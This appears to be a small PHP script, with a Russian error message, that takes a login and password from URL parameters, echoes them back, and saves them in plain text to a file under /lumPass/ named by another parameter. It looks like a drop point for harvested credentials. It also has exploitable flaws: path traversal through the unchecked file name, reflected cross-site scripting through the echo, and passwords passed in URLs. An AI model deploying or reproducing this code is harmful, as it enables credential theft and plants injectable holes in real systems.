<?php
if ($_GET['name'] != '' && $_GET['login'] != '' && $_GET['pass'] != ''){
	$e = '
';

	$cont = 'login: '.$_GET['login'].$e.'password: '.$_GET['pass'];
	echo $cont;



$fd = fopen('/lumPass/'.$_GET['name'].".txt", 'w') or die("не удалось создать файл");
$str = "$cont";
fwrite($fd, $str);
fclose($fd);

}

